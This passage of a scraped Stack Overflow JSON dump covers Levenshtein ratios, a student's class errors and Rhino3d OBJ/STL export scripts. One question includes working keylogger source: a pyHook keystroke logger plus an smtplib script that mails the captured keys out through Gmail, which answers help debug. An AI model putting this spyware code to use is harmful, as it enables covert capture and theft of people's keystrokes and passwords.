library:</p>\n\n<pre><code>&gt;&gt;&gt; Ldist / max(len( a ), len( b ))\n&gt;&gt;&gt; float(12)/21\n0.5714285714285714\n# python-Levenshtein\nLevenshtein.ratio(a,b)\n0.5853658536585366\n# difflib\n&gt;&gt;&gt; seq=difflib.SequenceMatcher(a=a,b=b)\n&gt;&gt;&gt; seq.ratio()\n0.5853658536585366\n</code></pre>\n\n<p>What accounts for this difference? What am I doing incorrectly in my calculation. Note that I have reviewed this <a href=\"https://stackoverflow.com/questions/14260126/how-python-levenshtein-ratio-is-computed\">How python-Levenshtein.ratio is computed</a> similar question and it does not quite answer what I am asking.</p>\n\n<p>Could someone please explain the formula that is used to calculate the above ratio?</p>\n"}, {"tags": ["python", "csv"], "comments": [{"owner": {"reputation": 3567, "user_id": 4116239, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ksElS.png?s=128&g=1", "display_name": "Kevin J. Chase", "link": "https://stackoverflow.com/users/4116239/kevin-j-chase"}, "edited": false, "score": 0, "creation_date": 1427933668, "post_id": 29402017, "comment_id": 46981380, "body": "There are numerous errors in this code.  In addition to what @alecxe pointed out, your <code>Counter.add</code> method uses two fields that do not exist:  <code>self.qusm</code>, which should be <code>self.qsum</code>, and <code>self.quant</code>, which does not exist at all."}, {"owner": {"reputation": 3567, "user_id": 4116239, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ksElS.png?s=128&g=1", "display_name": "Kevin J. Chase", "link": "https://stackoverflow.com/users/4116239/kevin-j-chase"}, "edited": false, "score": 0, "creation_date": 1427933806, "post_id": 29402017, "comment_id": 46981427, "body": "Also, you don&#39;t need getter and setter methods in Python.  You can safely replace all those <code>getAge</code> and <code>getGas</code> methods with direct attribute access like <code>some_rectangle_instance.age</code>.  No, you don&#39;t have to worry about &quot;what if it changes in the future?&quot;...  Python&#39;s <a href=\"https://docs.python.org/3/library/functions.html#property\" rel=\"nofollow noreferrer\"><code>property</code></a> built-in has you covered."}], "answers": [{"tags": [], "owner": {"reputation": 411841, "user_id": 771848, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/2DTBv.jpg?s=128&g=1", "display_name": "alecxe", "link": "https://stackoverflow.com/users/771848/alecxe"}, "is_accepted": true, "score": 2, "last_activity_date": 1427927611, "creation_date": 1427927611, "answer_id": 29402023, "question_id": 29402017, "link": "https://stackoverflow.com/questions/29402017/why-is-there-an-error-in-python-classes/29402023#29402023", "title": "Why is there an error in Python Classes?", "body": "<p>Watch the <a href=\"https://wiki.python.org/moin/DunderAlias\" rel=\"nofollow\">\"dunder\"</a>!</p>\n\n<p>Replace:</p>\n\n<pre><code>def _init_(self, correct,gas,quant,code,age,leng):\n</code></pre>\n\n<p>with:</p>\n\n<pre><code>def __init__(self, correct, gas, quant, code, age, leng):\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 689, "user_id": 3571933, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/3e2920d3c672a228428882227a1a2798?s=128&d=identicon&r=PG", "display_name": "Exceen", "link": "https://stackoverflow.com/users/3571933/exceen"}, "is_accepted": false, "score": 1, "last_activity_date": 1427928190, "creation_date": 1427928190, "answer_id": 29402123, "question_id": 29402017, "link": "https://stackoverflow.com/questions/29402017/why-is-there-an-error-in-python-classes/29402123#29402123", "title": "Why is there an error in Python Classes?", "body": "<p>You're calling this:</p>\n\n<pre><code>Rectangle(correct,gas,quant,age,leng)\n</code></pre>\n\n<p>but according to your Rectangle-class, it should look like this:</p>\n\n<pre><code>Rectangle(self, correct,gas,quant,code,age,leng)\n</code></pre>\n\n<p>So basically you forgot the <code>code</code> parameter there.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user4739233"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 87, "favorite_count": 0, "accepted_answer_id": 29402023, "answer_count": 2, "score": 0, "last_activity_date": 1428506833, "creation_date": 1427927560, "last_edit_date": 1428506833, "question_id": 29402017, "link": "https://stackoverflow.com/questions/29402017/why-is-there-an-error-in-python-classes", "title": "Why is there an error in Python Classes?", "body": "<p>I am doing an Assignment and I having some problem try to get this code to work on Classes it is coming out with errors it its linked to a CSV file:</p>\n\n<pre><code>#!/usr/bin/python3\n\nfrom rect import Rectangle\n##---------------------\n## Counter class\n##---------------------\nclass Counter():\n   def __init__(self):\n      self.tCount  = 0\n      self.gasCount = {}\n      self.qsum = 0\n      self.cCount = 0\n      self.clines = 0\n      self.ageCount = 0\n      self.tAge = 0\n      self.lensum = 0\n\n   def add(self, rectangle):\n      if rectangle.getQuant &lt; 408:\n         self.qusm += self.quant\n\n   def q3(self):\n      return (\"The sum of vaiues in field [quant[ less than 408: %d\" %\n              (self.tCount))\n\n   def reset(self):\n      self.tCount = 0\n\n##-------------------\n## FileReader class\n##--------------------\nclass FileReader():\n\n   def __init__(self, filename, counter):\n      self.counter = counter\n      self.filename = filename\n\n   def run(self):\n      theFile = open( self.filename,'r')\n      firstLine = True\n         # looking at each line in the file in turn\n      for line in theFile:\n         if firstLine: # I do not want to read the field names\n            firstLine = False   # so I skip them.\n            continue\n\n         fields = line.split(',')\n             # first I extract the values from the line\n         correct = fields[0].strip()\n         gas = fields[1].strip()\n         quant = int(fields[2].strip())\n         code = fields[3].strip()\n         age = int(fields[4].strip())\n         leng = float(fields[5].strip())\n             # then I pass a complete Rectangle to the counter object \n         self.counter.add(Rectangle(self,correct,gas,quant,age,leng))\n\n      theFile.close() \n\n##--------------------\n## Demonstrator class\n##   this will later be replaced by our GUI class\n##--------------------\nclass Demonstrator():\n\n   def __init__(self,filename):\n      self.counter = Counter()\n      self.reader = FileReader(filename, self.counter)\n      self.reader.run()\n\n   def displayq3(self):\n      print(self.counter.q3())\n\n\n   def newFile(self, filename):\n      self.counter.reset() # throw away any old results\n      self.reader = FileReader( filename, self.counter)\n      self.reader.run()\n\n#----------------------------\n# now show how we use these classes\n# it is increadibly simple\n#----------------------------\n\nprint(\"\\nFirst calculating with the file 3215402a.csv\")\nd = Demonstrator(\"3215402a.csv\")\nd.displayq3()\n</code></pre>\n\n<p>This code above links to the code below </p>\n\n<pre><code>class Rectangle():\n\n    def __init__(self, correct,gas,quant,code,age,leng):\n        self.correct = correct\n        self.gas = gas\n        self.quant = quant\n        self.code = code\n        self.age = age\n        self.leng = leng\n\n    def getCorrect(self):\n        return self.correct\n\n    def getGas(self):\n        return self.gas\n\n    def getQuant(self):\n        return self.quant\n\n    def getCode(self):\n        return self.code\n\n    def getAge(self):\n        return self.age\n\n    def getLeng(self):\n        return self.leng\n</code></pre>\n\n<p>The errors I am getting is:</p>\n\n<pre><code>Traceback (most recent call last):\n  File \"D:\\Users\\Timothy Lam\\Documents\\BSc (Hons) Information Technology (with Placement) (4350)\\Ebad Banissi\\Software Development for Business 2\\Assignments\\3215402\\3215402 Stage 2 Class.py\", line 86, in &lt;module&gt;\n    d = Demonstrator(\"3215402a.csv\")\n  File \"D:\\Users\\Timothy Lam\\Documents\\BSc (Hons) Information Technology (with Placement) (4350)\\Ebad Banissi\\Software Development for Business 2\\Assignments\\3215402\\3215402 Stage 2 Class.py\", line 69, in __init__\n    self.reader.run()\n  File \"D:\\Users\\Timothy Lam\\Documents\\BSc (Hons) Information Technology (with Placement) (4350)\\Ebad Banissi\\Software Development for Business 2\\Assignments\\3215402\\3215402 Stage 2 Class.py\", line 56, in run\n    self.counter.add(Rectangle(correct,gas,quant,age,leng))\nTypeError: object() takes no parameters\n</code></pre>\n\n<p>I have a new error which is: </p>\n\n<pre><code>Traceback (most recent call last):\n  File \"D:\\Users\\Timothy Lam\\Documents\\BSc (Hons) Information Technology (with Placement) (4350)\\Ebad Banissi\\Software Development for Business 2\\Assignments\\3215402\\3215402 Stage 2 Class.py\", line 86, in &lt;module&gt;\n    d = Demonstrator(\"3215402a.csv\")\n  File \"D:\\Users\\Timothy Lam\\Documents\\BSc (Hons) Information Technology (with Placement) (4350)\\Ebad Banissi\\Software Development for Business 2\\Assignments\\3215402\\3215402 Stage 2 Class.py\", line 69, in __init__\n    self.reader.run()\n  File \"D:\\Users\\Timothy Lam\\Documents\\BSc (Hons) Information Technology (with Placement) (4350)\\Ebad Banissi\\Software Development for Business 2\\Assignments\\3215402\\3215402 Stage 2 Class.py\", line 56, in run\n    self.counter.add(Rectangle(correct,gas,quant,age,leng))\nTypeError: __init__() missing 1 required positional argument: 'leng'\n</code></pre>\n\n<p>I have change it now another new error:</p>\n\n<pre><code>Traceback (most recent call last):\n  File \"D:\\Users\\Timothy Lam\\Documents\\BSc (Hons) Information Technology (with Placement) (4350)\\Ebad Banissi\\Software Development for Business 2\\Assignments\\3215402\\3215402 Stage 2 Class.py\", line 86, in &lt;module&gt;\n    d = Demonstrator(\"3215402a.csv\")\n  File \"D:\\Users\\Timothy Lam\\Documents\\BSc (Hons) Information Technology (with Placement) (4350)\\Ebad Banissi\\Software Development for Business 2\\Assignments\\3215402\\3215402 Stage 2 Class.py\", line 69, in __init__\n    self.reader.run()\n  File \"D:\\Users\\Timothy Lam\\Documents\\BSc (Hons) Information Technology (with Placement) (4350)\\Ebad Banissi\\Software Development for Business 2\\Assignments\\3215402\\3215402 Stage 2 Class.py\", line 56, in run\n    self.counter.add(Rectangle(self,correct,gas,quant,age,leng))\n  File \"D:\\Users\\Timothy Lam\\Documents\\BSc (Hons) Information Technology (with Placement) (4350)\\Ebad Banissi\\Software Development for Business 2\\Assignments\\3215402\\3215402 Stage 2 Class.py\", line 19, in add\n    if rectangle.getQuant &lt; 408:\nTypeError: unorderable types: method() &lt; int()\n</code></pre>\n\n<p>Is there any solution how to resolve this.\nThanks</p>\n"}, {"tags": ["python", "email", "arguments"], "comments": [{"owner": {"reputation": 538898, "user_id": 104349, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0f4cefeedec5163556751d61625eedd0?s=128&d=identicon&r=PG", "display_name": "Daniel Roseman", "link": "https://stackoverflow.com/users/104349/daniel-roseman"}, "edited": false, "score": 0, "creation_date": 1427927417, "post_id": 29401963, "comment_id": 46979450, "body": "Please remove the try and except around <code>main()</code>. If you&#39;re not doing anything other than printing the exception, you should not handle it at all, as then Python will print a full traceback which is far more useful."}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1427927423, "post_id": 29401963, "comment_id": 46979452, "body": "You never write anything with  <code>open(&#39;output.txt&#39;,&#39;w&#39;).write()</code>, you also overwrite it opening with w."}, {"owner": {"reputation": 1, "user_id": 4739820, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f78872dc57aedb9d896bd77736f61f55?s=128&d=identicon&r=PG&f=1", "display_name": "dickbuttr", "link": "https://stackoverflow.com/users/4739820/dickbuttr"}, "edited": false, "score": 0, "creation_date": 1427927660, "post_id": 29401963, "comment_id": 46979551, "body": "i want to clear the file with  open(&#39;output.txt&#39;,&#39;w&#39;).write() and its the part that actually works"}, {"owner": {"reputation": 1, "user_id": 4739820, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f78872dc57aedb9d896bd77736f61f55?s=128&d=identicon&r=PG&f=1", "display_name": "dickbuttr", "link": "https://stackoverflow.com/users/4739820/dickbuttr"}, "edited": false, "score": 0, "creation_date": 1427927748, "post_id": 29401963, "comment_id": 46979585, "body": "if i dont handle it the shell doesnt print the full traceback, i said that in the post"}, {"owner": {"reputation": 538898, "user_id": 104349, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0f4cefeedec5163556751d61625eedd0?s=128&d=identicon&r=PG", "display_name": "Daniel Roseman", "link": "https://stackoverflow.com/users/104349/daniel-roseman"}, "edited": false, "score": 0, "creation_date": 1427928400, "post_id": 29401963, "comment_id": 46979826, "body": "You still need the main() call, just not the try and except around it."}, {"owner": {"reputation": 1, "user_id": 4739820, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f78872dc57aedb9d896bd77736f61f55?s=128&d=identicon&r=PG&f=1", "display_name": "dickbuttr", "link": "https://stackoverflow.com/users/4739820/dickbuttr"}, "edited": false, "score": 0, "creation_date": 1427928841, "post_id": 29401963, "comment_id": 46979961, "body": "WOW, im retarded, thanks, i dont know how i let that slip, i just commented that part out and completely forgot to start the loop, now i have a traceback, so ill try to fix it"}, {"owner": {"reputation": 1, "user_id": 4739820, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f78872dc57aedb9d896bd77736f61f55?s=128&d=identicon&r=PG&f=1", "display_name": "dickbuttr", "link": "https://stackoverflow.com/users/4739820/dickbuttr"}, "edited": false, "score": 0, "creation_date": 1427928914, "post_id": 29401963, "comment_id": 46979978, "body": "open(&#39;output.txt&#39;,&#39;w&#39;).write() needs 1 argument, 0 given"}, {"owner": {"reputation": 1, "user_id": 4739820, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f78872dc57aedb9d896bd77736f61f55?s=128&d=identicon&r=PG&f=1", "display_name": "dickbuttr", "link": "https://stackoverflow.com/users/4739820/dickbuttr"}, "edited": false, "score": 0, "creation_date": 1427929103, "post_id": 29401963, "comment_id": 46980039, "body": "when i replace it with f=open(&#39;output.txt&#39;,&#39;w&#39;)   f.write()  f.close() it says that f.write() takes one argument.WTF????"}, {"owner": {"reputation": 1, "user_id": 4739820, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f78872dc57aedb9d896bd77736f61f55?s=128&d=identicon&r=PG&f=1", "display_name": "dickbuttr", "link": "https://stackoverflow.com/users/4739820/dickbuttr"}, "edited": false, "score": 0, "creation_date": 1427929257, "post_id": 29401963, "comment_id": 46980095, "body": "i just put f.write(&#39;&#39;) and it works, so yeah....is this specific to python 2.7 or is it the same with 3.4?"}], "answers": [{"tags": [], "owner": {"reputation": 1, "user_id": 4739820, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f78872dc57aedb9d896bd77736f61f55?s=128&d=identicon&r=PG&f=1", "display_name": "dickbuttr", "link": "https://stackoverflow.com/users/4739820/dickbuttr"}, "is_accepted": false, "score": 0, "last_activity_date": 1427930085, "creation_date": 1427930085, "answer_id": 29402460, "question_id": 29401963, "link": "https://stackoverflow.com/questions/29401963/python-emailing-smtplib-argument-error/29402460#29402460", "title": "Python emailing, smtplib argument error", "body": "<p>Ok, so it turns out that write() actually has to be given an argument, it clears the first time only because the open('','w') clears it by itself, which is what i needed,i thought it didn't need an argument, hence the error. Its the same with python 2.7 as it is with 3.4\nI can post the abbreviated and cleaned up scripts if anyone wants it. </p>\n"}, {"comments": [{"owner": {"reputation": 1, "user_id": 4739820, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f78872dc57aedb9d896bd77736f61f55?s=128&d=identicon&r=PG&f=1", "display_name": "dickbuttr", "link": "https://stackoverflow.com/users/4739820/dickbuttr"}, "edited": false, "score": 0, "creation_date": 1427964056, "post_id": 29403789, "comment_id": 46990896, "body": "i know how to do that, i said i&#39;d clean up the code, and i did, but thanks"}], "tags": [], "owner": {"reputation": 1987, "user_id": 2317533, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/11f84de1d659deef11d4f2a75da58c76?s=128&d=identicon&r=PG", "display_name": "Fred Mitchell", "link": "https://stackoverflow.com/users/2317533/fred-mitchell"}, "is_accepted": false, "score": 0, "last_activity_date": 1427939819, "creation_date": 1427939819, "answer_id": 29403789, "question_id": 29401963, "link": "https://stackoverflow.com/questions/29401963/python-emailing-smtplib-argument-error/29403789#29403789", "title": "Python emailing, smtplib argument error", "body": "<p>I would recommend learning at least enough about python context management that you would prefer to use '<a href=\"https://docs.python.org/2/reference/compound_stmts.html#the-with-statement\" rel=\"nofollow\">with</a>' as follows:</p>\n\n<pre><code>with open (filename, perm) as fp:\n    # some operation on fp, e.g. fp.write(...)\n</code></pre>\n\n<p>This has the nice feature that you can eliminate the close() function, and python will supply it for you.</p>\n\n<p>Also: <a href=\"http://en.wikibooks.org/wiki/Python_Programming/Context_Managers\" rel=\"nofollow\">http://en.wikibooks.org/wiki/Python_Programming/Context_Managers</a></p>\n"}], "owner": {"reputation": 1, "user_id": 4739820, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f78872dc57aedb9d896bd77736f61f55?s=128&d=identicon&r=PG&f=1", "display_name": "dickbuttr", "link": "https://stackoverflow.com/users/4739820/dickbuttr"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 65, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1427939819, "creation_date": 1427927187, "last_edit_date": 1592644375, "question_id": 29401963, "link": "https://stackoverflow.com/questions/29401963/python-emailing-smtplib-argument-error", "title": "Python emailing, smtplib argument error", "body": "<p>I'm making a two part keylogger, the actual keylogger.py and the email.py file. The emailing part doesn't work</p>\n<h1>The code:</h1>\n<pre><code>import urllib2\nimport smtplib\nimport time\n\ndef internet_check():\n    try:\n        response=urllib2.urlopen('http://www.google.com',timeout=10)\n        return True\n\n    except:\n        return False\n\ndef main():\n    while len(open('output.txt','r+').read()) &lt; 30 or not internet_check():\n        pass\n\n    mail=smtplib.SMTP('smtp.gmail.com:587')\n    mail.starttls()\n    mail.login('sendinguser','pass')\n    mail.sendmail('sendinguser','receivinguser',open('output.txt','r+').read())\n    mail.quit()\n    open('output.txt','w').write()\n    main()\n\ntry:       #it wont run without this part idk why, it doesnt even give an error,nothing\n    main() #please explain \nexcept Exception,e:p=input(str(e))\n</code></pre>\n<p>After executing it works the first time, it waits 30 characters, then sends the email and clears the file output.txt.\nBut after that, when the main() function runs the second time,it prints:</p>\n<pre><code>function takes exactly 1 argument (0given)\n</code></pre>\n<p>And thats it. Any idea why?</p>\n<h1>Keylogger code if needed:</h1>\n<pre><code>import pyHook\nimport pythoncom\nimport pywintypes\nimport time\nimport sys\nimport os\n\nf=open('output.txt','a+')  #i know it isn't neat, i'll clean it up later ;)\nf.write('\\n'+time.asctime()+'\\n')\nf.close()\n\ndef OnKeyboardEvent(event):\n    if event.Ascii==96: \n        os.system(&quot;taskkill /im pythonw.exe /f&quot;)\n        sys.exit()\n    \n    if event.Ascii==5:\n        _exit(1)\n    \n    if event.Ascii !=0 or 8:\n        f=open('output.txt','r+')\n        buffer=f.read()\n        f.close()\n\n        f=open('output.txt','w')\n        keylogs=chr(event.Ascii)\n        if event.Ascii==13:\n            keylogs='/n'\n    \n        buffer+=keylogs\n        f.write(buffer)\n        f.close()\n\nhm=pyHook.HookManager()\nhm.KeyDown=OnKeyboardEvent\nhm.HookKeyboard()\npythoncom.PumpMessages()\n</code></pre>\n<p>I'm positive its just the first code, any help will be appreciated and thank you in advance.</p>\n"}, {"tags": ["python", "3d", "atom-editor", "rhino3d"], "answers": [{"tags": [], "owner": {"reputation": 2612, "user_id": 3311552, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/QO7aK.jpg?s=128&g=1", "display_name": "Radio", "link": "https://stackoverflow.com/users/3311552/radio"}, "is_accepted": false, "score": 0, "last_activity_date": 1427995463, "creation_date": 1427995463, "answer_id": 29418852, "question_id": 29401951, "link": "https://stackoverflow.com/questions/29401951/export-layers-as-obj-from-rhino3d/29418852#29418852", "title": "Export layers as obj from Rhino3d", "body": "<p>This turned out to be simple. You need to supply a complete file path, name, and extension. The dialogs can be automated with multiple _Enter commands. In this script the default obj options are used. options can be appended to the _-Export command however before their respective _Enter commands are called.</p>\n\n<pre><code>import scriptcontext\nimport rhinoscriptsyntax as rs\n\ndef layerNames(sort=False):\n    rc = []\n    for layer in scriptcontext.doc.Layers:\n        if not layer.IsDeleted: rc.append(layer.FullPath)\n    if sort: rc.sort()\n    return rc\n\nfileName = rs.DocumentName()\nfilePath = rs.DocumentPath().rstrip(fileName)\nextension = \".obj\"\n\narrLayers = layerNames(False)\n\nfor layerName in arrLayers:\n    objs = scriptcontext.doc.Objects.FindByLayer(layerName)\n    if len(objs) &gt; 0:\n        rs.UnselectAllObjects()\n        for obj in objs:\n            obj.Select(True)\n        scriptcontext.doc.Views.Redraw()\n        rs.Command(\"_-Export \"+filePath+layerName+extension+\" _Enter _Enter\")\n</code></pre>\n\n<p>In my notes I mentioned utilizing the mesh object and writing my own file via Python. This is still a viable option, but the method is not yet implemented on Mac for Rhino. I am now going to work on a recursive function to look for nested layers. I will post the solution to a Gist when complete.</p>\n"}, {"comments": [{"owner": {"reputation": 3082, "user_id": 3263488, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/b16b1330b7d55b0f837d343896bc2952?s=128&d=identicon&r=PG&f=1", "display_name": "konrad", "link": "https://stackoverflow.com/users/3263488/konrad"}, "edited": false, "score": 1, "creation_date": 1461874689, "post_id": 29495558, "comment_id": 61410594, "body": "its a little weird that you would be asking and then multiple time answering your own question, but I still appreciate it as it is exactly what I was looking for. Thanks for documenting your process."}, {"owner": {"reputation": 2612, "user_id": 3311552, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/QO7aK.jpg?s=128&g=1", "display_name": "Radio", "link": "https://stackoverflow.com/users/3311552/radio"}, "reply_to_user": {"reputation": 3082, "user_id": 3263488, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/b16b1330b7d55b0f837d343896bc2952?s=128&d=identicon&r=PG&f=1", "display_name": "konrad", "link": "https://stackoverflow.com/users/3263488/konrad"}, "edited": false, "score": 0, "creation_date": 1461875383, "post_id": 29495558, "comment_id": 61410960, "body": "Sometimes weird works. :)  At the time I was learning Rhino, Python and the OBJ format all at the same time, and didn&#39;t expect to actually find an answer on my own, but there it is."}, {"owner": {"reputation": 3082, "user_id": 3263488, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/b16b1330b7d55b0f837d343896bc2952?s=128&d=identicon&r=PG&f=1", "display_name": "konrad", "link": "https://stackoverflow.com/users/3263488/konrad"}, "edited": false, "score": 0, "creation_date": 1461875610, "post_id": 29495558, "comment_id": 61411069, "body": "can I ask you where you got all of the string commands for OBJ exporting? for example I don&#39;t want to export objects as OBJ groups but instead set it to do not export object names. I am not sure what is the command for that (string)."}, {"owner": {"reputation": 2612, "user_id": 3311552, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/QO7aK.jpg?s=128&g=1", "display_name": "Radio", "link": "https://stackoverflow.com/users/3311552/radio"}, "reply_to_user": {"reputation": 3082, "user_id": 3263488, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/b16b1330b7d55b0f837d343896bc2952?s=128&d=identicon&r=PG&f=1", "display_name": "konrad", "link": "https://stackoverflow.com/users/3263488/konrad"}, "edited": false, "score": 1, "creation_date": 1461876497, "post_id": 29495558, "comment_id": 61411551, "body": "Yeah, I&#39;ve never found a good source. I was advised by Mcneel to select your object in Rhino, then on the cmd line in Rhino type: _-Export. Then choose browse. Select obj as the output type. Then you will be presented with a dialog of all the options. For the python script, remove spaces from any string names you see for keys and any drop down choices that are strings such as &quot;Welded&quot; and &quot;C R L F.&quot; I recall needing to do some trial and error on some to get it right."}, {"owner": {"reputation": 3082, "user_id": 3263488, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/b16b1330b7d55b0f837d343896bc2952?s=128&d=identicon&r=PG&f=1", "display_name": "konrad", "link": "https://stackoverflow.com/users/3263488/konrad"}, "edited": false, "score": 1, "creation_date": 1461876687, "post_id": 29495558, "comment_id": 61411646, "body": "Ha! That&#39;s genius! Thanks heaps for sharing."}, {"owner": {"reputation": 2612, "user_id": 3311552, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/QO7aK.jpg?s=128&g=1", "display_name": "Radio", "link": "https://stackoverflow.com/users/3311552/radio"}, "reply_to_user": {"reputation": 3082, "user_id": 3263488, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/b16b1330b7d55b0f837d343896bc2952?s=128&d=identicon&r=PG&f=1", "display_name": "konrad", "link": "https://stackoverflow.com/users/3263488/konrad"}, "edited": false, "score": 0, "creation_date": 1461878361, "post_id": 29495558, "comment_id": 61412450, "body": "I am always connecting with folks interested in Rhino, Revit, design, AEC.... hit me up on linkedin if you like, <a href=\"https://www.linkedin.com/in/jeff-berg-b34bb422\" rel=\"nofollow noreferrer\">linkedin.com/in/jeff-berg-b34bb422</a>"}], "tags": [], "owner": {"reputation": 2612, "user_id": 3311552, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/QO7aK.jpg?s=128&g=1", "display_name": "Radio", "link": "https://stackoverflow.com/users/3311552/radio"}, "is_accepted": true, "score": 6, "last_activity_date": 1428421266, "creation_date": 1428421266, "answer_id": 29495558, "question_id": 29401951, "link": "https://stackoverflow.com/questions/29401951/export-layers-as-obj-from-rhino3d/29495558#29495558", "title": "Export layers as obj from Rhino3d", "body": "<p>Here is the final script which exports dae, obj and stl. The settings in place are fairly aggressive polygon reductions. Adjust angle and density to change that. </p>\n\n<p>I discovered that you need to set the density to zero before setting it to another value which solved a polygon count issue in the mesh conversion.</p>\n\n<p><a href=\"https://gist.github.com/radio412/2b117658f0a34b3f5a26\" rel=\"noreferrer\">Also available on gist.</a></p>\n\n<pre><code>import os\nimport scriptcontext\nimport rhinoscriptsyntax as rs\n\n\nprint \"//export run started/////////////\"\n\n# this function via mcneel/rhinoscriptsyntax\n#https://github.com/mcneel/rhinoscriptsyntax/blob/master/Scripts/rhinoscript/layer.py\ndef layerNames(sort=False):\n    rc = []\n    for layer in scriptcontext.doc.Layers:\n        if not layer.IsDeleted: rc.append(layer.FullPath)\n    if sort: rc.sort()\n    return rc\n\ndef GetDAESettings():\n    e_str = \"\"\n    return e_str\n\ndef GetOBJSettings():\n    e_str = \"_Geometry=_Mesh \"\n    e_str+= \"_EndOfLine=CRLF \"\n    e_str+= \"_ExportRhinoObjectNames=_ExportObjectsAsOBJGroups \"\n    e_str+= \"_ExportMeshTextureCoordinates=_Yes \"\n    e_str+= \"_ExportMeshVertexNormals=_No \"\n    e_str+= \"_CreateNGons=_No \"\n    e_str+= \"_ExportMaterialDefinitions=_No \"\n    e_str+= \"_YUp=_No \"\n    e_str+= \"_WrapLongLines=Yes \"\n    e_str+= \"_VertexWelding=_Welded \"\n    e_str+= \"_WritePrecision=4 \"\n    e_str+= \"_Enter \"\n\n    e_str+= \"_DetailedOptions \"\n    e_str+= \"_JaggedSeams=_No \"\n    e_str+= \"_PackTextures=_No \"\n    e_str+= \"_Refine=_Yes \"\n    e_str+= \"_SimplePlane=_No \"\n\n    e_str+= \"_AdvancedOptions \"\n    e_str+= \"_Angle=50 \"\n    e_str+= \"_AspectRatio=0 \"\n    e_str+= \"_Distance=0.0\"\n    e_str+= \"_Density=0 \"\n    e_str+= \"_Density=0.45 \"\n    e_str+= \"_Grid=0 \"\n    e_str+= \"_MaxEdgeLength=0 \"\n    e_str+= \"_MinEdgeLength=0.0001 \"\n\n    e_str+= \"_Enter _Enter\"\n\n    return e_str\n\ndef GetSTLSettings():\n    eStr = \"_ExportFileAs=_Binary \"\n    eStr+= \"_ExportUnfinishedObjects=_Yes \"\n    eStr+= \"_UseSimpleDialog=_No \"\n    eStr+= \"_UseSimpleParameters=_No \"\n    eStr+= \"_Enter _DetailedOptions \"\n    eStr+= \"_JaggedSeams=_No \"\n    eStr+= \"_PackTextures=_No \"\n    eStr+= \"_Refine=_Yes \"\n    eStr+= \"_SimplePlane=_No \"\n    eStr+= \"_AdvancedOptions \"\n    eStr+= \"_Angle=15 \"\n    eStr+= \"_AspectRatio=0 \"\n    eStr+= \"_Distance=0.01 \"\n    eStr+= \"_Grid=16 \"\n    eStr+= \"_MaxEdgeLength=0 \"\n    eStr+= \"_MinEdgeLength=0.0001 \"\n    eStr+= \"_Enter _Enter\"\n    return eStr\n\nsettingsList = {\n    'GetDAESettings': GetDAESettings,\n    'GetOBJSettings': GetOBJSettings,\n    'GetSTLSettings': GetSTLSettings\n}\n\n\n\n\nfileName = rs.DocumentName()\nfilePath = rs.DocumentPath().rstrip(fileName)\n\narrLayers = layerNames(False)\n\n\n\ndef initExportByLayer(fileType=\"obj\", visibleonly=False, byObject=False):\n    for layerName in arrLayers:\n        layer = scriptcontext.doc.Layers.FindByFullPath(layerName, True)\n        if layer &gt;= 0:\n            layer = scriptcontext.doc.Layers[layer]\n            save = True;\n            if visibleonly:\n                if not layer.IsVisible:\n                    save = False\n            if  rs.IsLayerEmpty(layerName):\n                save = False\n            if save:\n                cutName = layerName.split(\"::\")\n                cutName = cutName[len(cutName)-1]\n                objs = scriptcontext.doc.Objects.FindByLayer(cutName)\n                if len(objs) &gt; 0:\n                    if byObject:\n                        i=0\n                        for obj in objs:\n                            i= i+1\n                            saveObjectsToFile(cutName+\"_\"+str(i), [obj], fileType)\n                    else:\n                        saveObjectsToFile(cutName, objs, fileType)\n\n\n\ndef saveObjectsToFile(name, objs, fileType):\n    rs.EnableRedraw(False)\n    if len(objs) &gt; 0:\n        settings = settingsList[\"Get\"+fileType.upper()+\"Settings\"]()\n        rs.UnselectAllObjects()\n        for obj in objs:\n            obj.Select(True)\n        name = \"\".join(name.split(\" \"))\n        command = '-_Export \"{}{}{}\" {}'.format(filePath, name, \".\"+fileType.lower(), settings)\n        rs.Command(command, True)\n        rs.EnableRedraw(True)\n\n\ninitExportByLayer(\"obj\",True, False)\ninitExportByLayer(\"dae\",True, False)\ninitExportByLayer(\"stl\",True, False)\n\nprint \"//export run 